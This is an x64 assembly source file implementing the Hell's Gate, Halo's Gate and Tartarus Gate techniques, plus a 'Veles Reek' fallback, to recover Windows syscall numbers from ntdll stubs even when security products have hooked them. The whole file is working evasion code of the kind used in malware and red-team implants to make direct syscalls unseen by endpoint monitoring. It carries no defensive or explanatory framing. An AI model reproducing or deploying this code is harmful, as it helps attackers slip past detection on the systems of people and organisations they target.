
.data 
extern hNtDll:qword

.code
extern GetNtDLLText:proc
extern is_exported_function:proc

; Input	 => RCX -> A pointer to the targeted NTAPI
; Output => AX  -> The Syscall Service Number 
resolve_ssn proc
	push rsi
	push rdi
	push rbx
	push rcx
	push 0h ; Will be used as a counter
	
	call HellsGateGrabber
	cmp ax, 0FFFFh
	jne resolve_done

	tartarus_gate:
	mov rcx, qword ptr [rsp + 8h]
	mov rdx, qword ptr [rsp]
	call HaloGateDown
	cmp ax, 0FFFFh
	jne resolve_done
	; Reload rcx and rdx again, because the procedure destroy them
	mov rcx, qword ptr [rsp + 8h]
	mov rdx, qword ptr [rsp]
	call HaloGateUp
	cmp ax, 0FFFFh
	jne resolve_done
	inc qword ptr [rsp]
	cmp qword ptr [rsp], 1D6h
	jne tartarus_gate
	
	; If Halos/Tartarus gate failed, we use Veles Reek
	mov rcx, rsp
	call GetNtDLLText 
	mov rcx, qword ptr [rsp]
	mov rdx, rax
	mov r8, qword ptr [rsp + 8h]
	call VelesReek

	resolve_done:
	pop rcx
	pop rcx
	pop rbx
	pop rdi
	pop rsi
	ret
resolve_ssn endp

; Grab syscall number dynamically
HellsGateGrabber proc
	;**********************************************************************
	;	every syscall starts with the following instrucions
	;	    - mov r10, rcx
	;	    - mov eax, <SyscallNumber> <-- We need to resolve this number
	;**********************************************************************

	
	mov esi, 0b8d18b4ch   ; syscall pattern
	mov edi, [rcx]        ; move the syscall content into edi 
	cmp esi, edi          ; Check if hooked or not
	jne InvalidSyscall    ; return -1 if hooked
	xor rax, rax          ; Clear accumlator 
	mov ax, [rcx + 4]     ; Grab the syscall number
	ret
HellsGateGrabber endp

; Try to resolve syscall from neighbors
HaloGateDown proc
	mov rax, 20h         ; Stub size
	xor bx, bx           ; Clear bx register
	mov bx, dx           ; Save dx in bx to use it later, because mul instruction will destroy dx
	mul dx               ; Multiply size of syscall by the index of neighbors
	add rcx, rax         ; Go down
	mov edi, [rcx]       ; Move the neighbor syscall content into edi 
	mov esi, 0b8d18b4ch  ; Native API instructions pattern
	cmp esi, edi         ; Check if the given NTAPI Address matches the pattern
	jne InvalidSyscall   ; If hooked return -1

	; Return the syscall number
	xor rax, rax
	mov ax, [rcx + 4]
	sub ax, bx
	ret
HaloGateDown endp

; Try to resolve syscall from neighbors
HaloGateUp proc
	mov rax, 20h 
	xor bx, bx 
	mov bx, dx
	mul dx
	sub rcx, rax     ; Go up
	mov edi, [rcx]
	mov esi, 0b8d18b4ch
	cmp esi, edi
	jne InvalidSyscall

	xor rax, rax
	mov ax, [rcx + 4]
	add ax, bx
	ret
HaloGateUp endp

; Used in VelesReek
FixSyscallNumber proc
	inc rax
	ret
FixSyscallNumber endp

; Calculate syscall number from its position between others syscalls
VelesReek proc
	mov bx, 0FFFFh
	mov edi, 0cdc3050fh  ; Pattern of -> 'syscall ; ret ; int'

	DIG:
	mov esi, [rdx]       ; Move instructions into esi to campare with the pattern
	cmp esi, edi         ; Compare pattern with current instructions
	je SYSCALL_FOUND
	
	NEXT:
	inc rdx              ; Move to the next address
	loop DIG             ; Dig deeper

	; To avoid the unexpected behavior if the given module address was not the expected 
	jmp InvalidSyscall
	
	SYSCALL_FOUND:
	lea rax, [rdx - 12h] ; Stub address
	push rax
	push r8
	push rdx
	mov rcx, hNtDll
	mov rdx, rax
	call is_exported_function
	test rax, rax
	pop rdx
	pop r8
	pop rax
	jz NEXT
	inc bx               ; Increase SSN counter
	cmp rax, r8          ; Check if it is the target stub or not, to continue in digging
	jne NEXT             ; If it is not the target syscall, dig deeper
	movzx rax, bx        ; For return syscall number
	mov cx, 05ah         ; NtQuerySystemTime syscall number
	cmp bx, cx           ; check if the syscall number we found after NtQuerySystemTime or not

	; If the syscall number we found is greater than NtQuerySystemTime number, we must increase it by one
	; because we missed this syscall, because it does not have the pattern we use.
	jge FixSyscallNumber

	ret
VelesReek endp

InvalidSyscall proc
	mov rax, 0FFFFh
	ret
InvalidSyscall endp
	
end